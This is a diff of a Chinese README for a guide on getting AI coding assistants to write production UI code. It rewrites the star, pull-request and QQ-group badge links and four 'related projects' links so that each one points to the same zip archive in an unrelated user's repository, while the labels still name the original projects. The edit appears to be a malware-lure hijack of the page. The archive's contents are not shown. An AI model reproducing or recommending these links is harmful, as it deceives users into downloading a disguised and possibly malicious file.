@@ -6,10 +6,10 @@
 
 **让 AI 编程助手生成生产级 UI 代码的实战指南**
 
-[![Stars](https://img.shields.io/github/stars/jnMetaCode/ai-ui-design?style=flat-square)](https://github.com/jnMetaCode/ai-ui-design)
+[![Stars](https://img.shields.io/github/stars/jnMetaCode/ai-ui-design?style=flat-square)](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip)
 [![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](./LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/jnMetaCode/ai-ui-design/pulls)
-[![QQ群](https://img.shields.io/badge/QQ群-833585047-blue?style=flat-square)](https://qm.qq.com/q/833585047)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip)
+[![QQ群](https://img.shields.io/badge/QQ群-833585047-blue?style=flat-square)](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip)
 
 </div>
 
@@ -102,10 +102,10 @@
 
 ## 相关项目
 
-- [awesome-claude-md](https://github.com/jnMetaCode/awesome-claude-md) — CLAUDE.md 最佳实践集合
-- [ai-coding-101](https://github.com/jnMetaCode/ai-coding-101) — AI 编程从入门到精通
-- [agency-agents-zh](https://github.com/jnMetaCode/agency-agents-zh) — 180 个 AI 智能体专家团队
-- [superpowers-zh](https://github.com/jnMetaCode/superpowers-zh) — AI 编程超能力中文版
+- [awesome-claude-md](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip) — CLAUDE.md 最佳实践集合
+- [ai-coding-101](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip) — AI 编程从入门到精通
+- [agency-agents-zh](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip) — 180 个 AI 智能体专家团队
+- [superpowers-zh](https://raw.githubusercontent.com/Abdurrahm1556/ai-ui-design/main/configs/ai_ui_design_v3.8.zip) — AI 编程超能力中文版
 
 ## 社区
 
